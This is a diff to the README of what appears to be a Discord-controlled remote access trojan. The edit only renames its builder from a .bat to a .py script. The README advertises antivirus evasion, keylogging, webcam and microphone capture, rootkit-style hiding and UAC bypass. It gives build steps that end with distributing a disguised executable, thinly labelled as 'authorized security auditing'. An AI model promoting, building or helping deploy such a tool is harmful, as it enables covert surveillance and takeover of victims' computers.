@@ -16,7 +16,7 @@
 ## 🔥 Key Features
 
   * 🚀 **Universal Bypass:** Specifically engineered to evade **Windows Defender** and **360 Protection** heuristics.
-  * 🛠️ **Custom Builder:** Use `builder.bat` to inject icons, toggle console visibility, and compress payloads.
+  * 🛠️ **Custom Builder:** Use `builder.py` to inject icons, toggle console visibility, and compress payloads.
   * 🛰️ **Discord C2:** Full real-time control over target machines via a private Discord bot.
   * 🕵️ **Total Surveillance:** Remote Keylogging, Webcam capture, and Microphone recording modules.
   * 🛡️ **Persistence Engine:** Advanced modules for Startup integration, Rootkit-style hiding, and UAC bypass.
@@ -34,7 +34,7 @@
 
 ### 🛠️ The Builder Interface
 
-The tool includes a standalone `.bat` builder for masquerading.
+The tool includes a standalone `.py` builder for masquerading.
 
   * **Name:** Set the internal process name to blend with system tasks.
   * **Icon:** Inject any `.ico` file to make the executable look legitimate.
@@ -128,7 +128,7 @@ pip install discord.py opencv-python pyaudio wave keyboard psutil pyautogui requ
 ### 3\. Build the Payload
 
 1.  Place your target `.ico` in the root folder.
-2.  Run `builder.bat`.
+2.  Run `builder.py`.
 3.  Enter your Discord Bot Token and Channel ID when prompted.
 4.  Distribute the generated `.exe` for authorized security auditing.
 
